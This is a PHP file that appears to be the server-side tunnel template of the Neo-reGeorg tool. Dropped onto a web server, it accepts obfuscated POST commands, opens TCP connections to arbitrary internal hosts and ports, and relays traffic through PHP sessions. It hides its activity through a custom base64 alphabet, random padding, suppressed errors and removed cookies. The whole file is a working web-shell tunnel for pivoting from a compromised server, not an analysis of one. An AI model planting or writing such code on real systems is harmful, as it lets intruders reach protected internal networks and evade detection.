<?php
ini_set("allow_url_fopen", true);
ini_set("allow_url_include", true);
ini_set('always_populate_raw_post_data', -1);
error_reporting(E_ERROR | E_PARSE);

if(version_compare(PHP_VERSION,'5.4.0','>='))@http_response_code(HTTPCODE);

function blv_decode($data) {
    $data_len = strlen($data);
    $info = array();
    $i = 0;
    while ( $i < $data_len) {
        $d = unpack("c1b/N1l", substr($data, $i, 5));
        $b = $d['b'];
        $l = $d['l'] - BLV_L_OFFSET;
        $i += 5;
        $v = substr($data, $i, $l);
        $i += $l;
        $info[$b] = $v;
    }
    return $info;
}

function blv_encode($info) {
    $data = "";
    $info[0] = randstr();
    $info[39] = randstr();

    foreach($info as $b => $v) {
        $l = strlen($v) + BLV_L_OFFSET;
        $data .= pack("c1N1", $b, $l);
        $data .= $v;
    }
    return $data;
}

function randstr() {
    $rand = '';
    $length = mt_rand(5, 20);
    for ($i = 0; $i < $length; $i++) {
        $rand .= chr(mt_rand(0, 255));
    }
    return $rand;
}

$DATA          = 1;
$CMD           = 2;
$MARK          = 3;
$STATUS        = 4;
$ERROR         = 5;
$IP            = 6;
$PORT          = 7;
$REDIRECTURL   = 8;
$FORCEREDIRECT = 9;
$PING          = 10;

$SESSION_TTL = 120;

$en = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
$de = "BASE64 CHARSLIST";

$post_data = file_get_contents("php://input");
if (USE_REQUEST_TEMPLATE == 1) {
    $post_data = substr($post_data, START_INDEX);
    $post_data = substr($post_data, 0, -END_INDEX);
}
$info = blv_decode(base64_decode(strtr($post_data, $de, $en)));
$rinfo = array();

$mark = $info[$MARK];
$cmd = $info[$CMD];
$run = "run".$mark;
$writebuf = "writebuf".$mark;
$readbuf = "readbuf".$mark;
$activekey = $mark . "_active";

switch($cmd){
    case "CONNECT":
        {
            set_time_limit(0);
            $target = $info[$IP];
            $port = (int) $info[$PORT];
            $res = fsockopen($target, $port, $errno, $errstr, 3);
            if ($res === false)
            {
                $rinfo[$STATUS] = 'FAIL';
                $rinfo[$ERROR] = 'Failed connecting to target';
                break;
            }

            stream_set_blocking($res, false);
            ignore_user_abort();

            @session_start();
            $_SESSION[$run] = true;
            $_SESSION[$writebuf] = "";
            $_SESSION[$readbuf] = "";
            $_SESSION[$activekey] = time();
            session_write_close();

            while (true)
            {
                @session_start();
                $running = isset($_SESSION[$run]) ? $_SESSION[$run] : false;
                $lastActive = isset($_SESSION[$activekey]) ? $_SESSION[$activekey] : 0;
                $writeBuff = isset($_SESSION[$writebuf]) ? $_SESSION[$writebuf] : "";
                $_SESSION[$writebuf] = "";
                if ($lastActive > 0 && (time() - $lastActive) > $SESSION_TTL) {
                    $_SESSION[$run] = false;
                    $running = false;
                }
                session_write_close();

                if (!$running) {
                    break;
                }

                if ($writeBuff === "") {
                    usleep(50000);
                }

                $readBuff = "";
                if ($writeBuff != "")
                {
                    stream_set_blocking($res, false);
                    $i = fwrite($res, $writeBuff);
                    if($i === false)
                    {
                        @session_start();
                        $_SESSION[$run] = false;
                        session_write_close();
                        break;
                    }
                }
                stream_set_blocking($res, false);
                while ($o = fgets($res, READBUF)) {
                    $readBuff .= $o;
                    if ( strlen($readBuff) > MAXREADSIZE ) {
                        break;
                    }
                }
                if ($readBuff != ""){
                    @session_start();
                    $_SESSION[$readbuf] .= $readBuff;
                    $_SESSION[$activekey] = time();
                    session_write_close();
                }
            }
            fclose($res);
        }
        @header_remove('set-cookie');
        break;
    case "DISCONNECT":
        {
            @session_start();
            unset($_SESSION[$run]);
            unset($_SESSION[$readbuf]);
            unset($_SESSION[$writebuf]);
            unset($_SESSION[$activekey]);
            session_write_close();
            $rinfo[$STATUS] = 'OK';
        }
        break;
    case "READ":
        {
            @session_start();
            $readBuffer = isset($_SESSION[$readbuf]) ? $_SESSION[$readbuf] : "";
            $_SESSION[$readbuf]="";
            $running = isset($_SESSION[$run]) ? $_SESSION[$run] : false;
            $lastActive = isset($_SESSION[$activekey]) ? $_SESSION[$activekey] : 0;
            if ($running && $lastActive > 0 && (time() - $lastActive) > $SESSION_TTL) {
                $_SESSION[$run] = false;
                $running = false;
            }
            session_write_close();
            if ($running) {
                $rinfo[$STATUS] = 'OK';
                $rinfo[$DATA] = $readBuffer;
                @session_start();
                $_SESSION[$activekey] = time();
                session_write_close();
                header("Connection: Keep-Alive");
            } else {
                $rinfo[$STATUS] = 'FAIL';
                $rinfo[$ERROR] = 'TCP session is closed';
            }
        }
        break;
    case "FORWARD": {
            @session_start();
            $running = isset($_SESSION[$run]) ? $_SESSION[$run] : false;
            $lastActive = isset($_SESSION[$activekey]) ? $_SESSION[$activekey] : 0;
            if ($running && $lastActive > 0 && (time() - $lastActive) > $SESSION_TTL) {
                $_SESSION[$run] = false;
                $running = false;
            }
            session_write_close();
            if(!$running){
                $rinfo[$STATUS] = 'FAIL';
                $rinfo[$ERROR] = 'TCP session is closed';
                break;
            }
            $rawPostData = $info[$DATA];
            if ($rawPostData) {
                @session_start();
                $_SESSION[$writebuf] .= $rawPostData;
                $_SESSION[$activekey] = time();
                session_write_close();
                $rinfo[$STATUS] = 'OK';
                header("Connection: Keep-Alive");
            } else {
                $rinfo[$STATUS] = 'FAIL';
                $rinfo[$ERROR] = 'POST data parse error';
            }
        }
        break;
    case "PING": {
            @session_start();
            $running = isset($_SESSION[$run]) ? $_SESSION[$run] : false;
            $lastActive = isset($_SESSION[$activekey]) ? $_SESSION[$activekey] : 0;
            if ($running && $lastActive > 0 && (time() - $lastActive) > $SESSION_TTL) {
                $_SESSION[$run] = false;
                $running = false;
            }
            if ($running) {
                $_SESSION[$activekey] = time();
                $rinfo[$STATUS] = 'OK';
            } else {
                $rinfo[$STATUS] = 'FAIL';
                $rinfo[$ERROR] = 'TCP session is closed';
            }
            session_write_close();
        }
        break;
    default: {
        $sayhello = true;
        @session_start();
        session_write_close();
    }
}
if ( $sayhello ) {
    echo base64_decode(strtr("NeoGeorg says, 'All seems fine'", $de, $en));
} else {
    echo strtr(base64_encode(blv_encode($rinfo)), $en, $de);
}
